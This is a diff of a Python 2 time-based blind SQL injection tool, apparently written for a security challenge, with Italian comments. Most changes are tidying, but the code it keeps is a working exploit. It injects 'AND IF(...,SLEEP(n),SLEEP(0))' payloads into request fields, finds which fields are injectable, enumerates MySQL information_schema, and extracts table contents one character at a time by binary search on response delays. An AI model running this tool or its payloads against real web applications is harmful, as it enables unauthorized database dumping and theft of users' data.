@@ -1,16 +1,14 @@
-# Author: Alessio Gilardi
 # Title: Time Based Blind SQL Injection Tool
+# Author: Alessio Gilardi
 
-# The tool takes in input an URL, a method, a list of possibly vulnerable fields and a list of valid values for the respctive fields.
+# The tool takes in input an URL, a method, a list of possibly vulnerable fields with the respctive values.
 # Once found, the tool ask the user to select a database and a table to dump, after it prints the results.
 
-# Usage: time_based_sql_injection.py <URL> <METHOD [GET|POST]> <fields ['field1', 'field2']> <values ['value1', 'value2']>
+# Usage: time_based_blind_sql_injection.py [-h] [-u URL] [-d {'<field>': '<value>',...}] [-m <GET|POST>] [-s SLEEP] [-t THREADS] [-v] [-l]
+
 
 import requests, sys, ast, binascii, argparse, threading
 
-#METHODS = ['GET', 'POST']
-#M_GET = 0
-#M_POST = 1
 M_GET = 'GET'
 M_POST = 'POST'
 
@@ -24,7 +22,7 @@ AND_SUFF = 2
 
 verbose = 0
 log = 0
-LOG_FILE_NAME = 'log.txt'
+LOG_FILE_NAME = 'challenge2.md'
 
 # MySQL DB Tables #
 INFORMATION_SCHEMA_DB_NAME = 'information_schema'
@@ -33,7 +31,7 @@ INF_SCHEMA_SCHEMATA = 'SCHEMATA'
 INF_SCHEMA_SCHEMATA_SCHEMA_NAME = 'SCHEMA_NAME' # Nome del db
 
 INF_SCHEMA_TABLES = 'TABLES'
-#used in where clause
+# used in where clause
 INF_SCHEMA_TABLES_TABLE_SCHEMA = 'TABLE_SCHEMA'
 
 INF_SCHEMA_TABLES_TABLE_NAME = 'TABLE_NAME'
@@ -78,7 +76,8 @@ def print_user_choice_table(values, title = ''):
 
     return choice
 
-# Converte un stringa in una lista di interi e poi la lista in una stringa con gli interi separati da virgola
+# Converte un stringa in una lista di interi
+# e poi la lista in una stringa con gli interi separati da virgola
 def string_to_int_list(s):
     lst = []
     for c in s:
@@ -89,7 +88,6 @@ def string_to_int_list(s):
 def avg_time(times):
     if len(times) == 1:
         return times[0]
-
     max_index = -1
     max_time = 0
     for i in range(len(times)):
@@ -146,10 +144,8 @@ def measure_request_time(url, method, headers, cookies, data):
             t = myRequestThread(i, 'T-'+str(i), url, method, headers, cookies, data, times)
             t.start()
             threads.append(t)
-
         for t in threads:
             t.join()
-
         return avg_time(times)
 
 
@@ -213,15 +209,12 @@ def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
 
     return vuln_fields
 
-
-
 # Determina il numero di righe di una tabella del database
 def find_table_rows_count(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, sleep_time, where_param = '', where_value = ''):
     m_data = data.copy()
     table = db_name + '.' + table_name
     sql_inj = ' AND IF(({})={},SLEEP({}),SLEEP(0))'
     query = 'SELECT COUNT(*) FROM {}'
-
     file = ''
 
     if vuln_type != NO_SUFF:
@@ -237,28 +230,19 @@ def find_table_rows_count(url, method, headers, cookies, data, vuln_field, vuln_
             query += ' WHERE {}=CHAR({})'.format(where_param, string_to_int_list(where_value))
 
     if verbose:
-        #print
         print '\nDeterminating number of rows of table: %s\n' % table_name
-        #print
     if log:
         file = open(LOG_FILE_NAME, 'a')
-        #file.write('\n')
         file.write('\nDeterminating number of rows of table: %s\n\n' % table_name)
-        #file.write('\n')
-        #file.write('\n')
-
 
     found = 0
     count = 0
     while not found:
         m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(table), str(count), str(sleep_time))
         if verbose:
-            #print '{' + vuln_field + ': ' + m_data[vuln_field] + '}'
             print '{{{}: {}}}'.format(vuln_field, m_data[vuln_field])
         if log:
             file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
-            #file.write('{' + vuln_field + ': ' + m_data[vuln_field] + '}')
-            #file.write('\n')
         elapsed = measure_request_time(url, method, headers, cookies, m_data)
         if elapsed >= sleep_time:
             found = 1
@@ -266,17 +250,10 @@ def find_table_rows_count(url, method, headers, cookies, data, vuln_field, vuln_
             count += 1
 
     if verbose:
-        #print
-        #print table_name + ': ' + str(count) + ' rows'
-        #print
         print '\n{}: {} rows\n'.format(table_name, str(count))
 
     if log:
         file.write('\n{}: {} rows\n\n'.format(table_name, str(count)))
-        #file.write('\n')
-        #file.write(table_name + ': ' + str(count) + ' rows')
-        #file.write('\n')
-        #file.write('\n')
         file.close()
 
     return count
@@ -289,7 +266,7 @@ def find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type,
     table = db_name + '.' + table_name
     sql_inj = ' AND IF(({})={},SLEEP({}),SLEEP(0))'
     query = 'SELECT LENGTH({}) FROM {}'
-    limit = ' LIMIT {},1 '
+    limit = ' LIMIT {},1'
     file = ''
 
     if vuln_type != NO_SUFF:
@@ -307,17 +284,11 @@ def find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type,
     if limit_row != '':
             query += limit.format(str(limit_row))
 
-
     if verbose:
-        #print
         print '\nDeterminating number of characters in the field: %s\n\n' % column_name
-        #print
     if log:
         file = open(LOG_FILE_NAME, 'a')
-        #file.write('\n')
         file.write('\nDeterminating number of characters in the field: %s\n\n' % column_name)
-        #file.write('\n')
-        #file.write('\n')
 
     found = 0
     length = 0
@@ -325,12 +296,9 @@ def find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type,
         length += 1
         m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(column_name, table), str(length), str(sleep_time))
         if verbose:
-            #print '{' + vuln_field + ': ' + m_data[vuln_field] + '}'
             print '{{{}: {}}}'.format(vuln_field, m_data[vuln_field])
         if log:
             file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
-            #file.write('{' + vuln_field + ': ' + m_data[vuln_field] + '}')
-            #file.write('\n')
         elapsed = measure_request_time(url, method, headers, cookies, m_data)
         if elapsed == -1:
             return -1
@@ -340,14 +308,9 @@ def find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type,
             return -1
 
     if verbose:
-        #print
         print '\nField length: %i\n' % length
-        #print
     if log:
-        #file.write('\n')
         file.write('\nField length: %i\n\n' % length)
-        #file.write('\n')
-        #file.write('\n')
         file.close()
 
     return length
@@ -359,8 +322,7 @@ def find_data_val_binary(url, method, headers, cookies, data, vuln_field, vuln_t
     table = db_name + '.' + table_name
     sql_inj = ' AND IF(({}){}{},SLEEP({}),SLEEP(0))'
     query = 'SELECT ORD(MID({},{},1)) FROM {} '
-    limit = ' LIMIT {},1 '
-
+    limit = ' LIMIT {},1'
     file = ''
 
     if vuln_type != NO_SUFF:
@@ -379,15 +341,10 @@ def find_data_val_binary(url, method, headers, cookies, data, vuln_field, vuln_t
             query += limit.format(str(limit_row))
 
     if verbose:
-        #print
         print '\nDeterminating values of field: %s\n' % column_name
-        #print
     if log:
         file = open(LOG_FILE_NAME, 'a')
-        #file.write('\n')
         file.write('\nDeterminating values of field: %s\n\n' % column_name)
-        #file.write('\n')
-        #file.write('\n')
 
     for i in range(1, db_field_length + 1):
         found = 0
@@ -399,28 +356,21 @@ def find_data_val_binary(url, method, headers, cookies, data, vuln_field, vuln_t
             m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(column_name, str(i), table), '=', current, sleep_time)
             if verbose:
                 print '{{{}: {}}}'.format(vuln_field, m_data[vuln_field])
-                #print '{' + vuln_field + ': ' + m_data[vuln_field] + '}'
             if log:
                 file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
-                #file.write('{' + vuln_field + ': ' + m_data[vuln_field] + '}')
-                #file.write('\n')
             elapsed = measure_request_time(url, method, headers, cookies, m_data)
 
             if elapsed >= sleep_time:
                 data_val.append(chr(current))
                 found = 1
                 if verbose:
-                    #print
                     print '\nFound character: %c\n\n' % chr(current)
-                    #print
-                    #print
-
             else:
                 m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(column_name, str(i), table), '>', current, sleep_time)
                 if verbose:
                     print '{{{}: {}}}'.format(vuln_field, m_data[vuln_field])
                 if log:
-                    file.write('{{{}: {}}}\n\n'.format(vuln_field, m_data[vuln_field]))
+                    file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
                 elapsed = measure_request_time(url, method, headers, cookies, m_data)
                 if elapsed >= sleep_time:
                     low = current
@@ -483,7 +433,6 @@ def main(argv):
     table_name = '' # Selected table name
 
     # Inizio dell'attacco #
-
     print '\nStarting attack on URL: %s\n' % url
 
     if log:
@@ -500,17 +449,16 @@ def main(argv):
 
         if log:
             file = open(LOG_FILE_NAME, 'a')
-            file.write('# Average response time: %i s\n' % avg_resp_time)
-            file.write('# Using sleep time: %i s\n\n' % sleep_time)
+            file.write('# Average response time: %.6f s\n' % avg_resp_time)
+            file.write('# Using sleep time: %.6f s\n\n' % sleep_time)
             file.close()
 
-    print 'Using sleep time: %i s\n' % sleep_time
+    print 'Using sleep time: %.6f s\n' % sleep_time
 
     # Trovo i campi vulnerabili #
     print 'Looking for vulnerable fields...\n'
     vuln = find_vuln_fields(url, method, headers, cookies, data, sleep_time)
     vuln_fields = vuln.keys()
-
 
     if len(vuln_fields) == 0:
         if log:
@@ -520,12 +468,9 @@ def main(argv):
         print 'No vulnerable field found'
         sys.exit(0)
 
-
     f = print_user_choice_table(vuln_fields, 'Vulnerable fields')
     sel_vuln_field = vuln_fields[f]
     sel_vuln_type = vuln[sel_vuln_field]
-
-
 
     # Cerco i nomi dei database #
     print '\nLooking for database names, please wait...'
@@ -559,7 +504,7 @@ def main(argv):
 
     # Cerco i nomi delle colonne nella tabella selezionata #
     print 'Looking for columns in %s, please wait...\n' % table_name
-    where_param = inf_schema_columns_table_name
+    where_param = INF_SCHEMA_COLUMNS_TABLE_NAME
     where_value = table_name
     rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_COLUMNS, sleep_time, where_param, where_value)
     for i in range(rows_count):
@@ -567,7 +512,6 @@ def main(argv):
 
     print columns
     ###########################################
-
 
     # Cerco i dati nella tabella selezionata #
     print '\nLooking for %s data, please wait...\n' % table_name
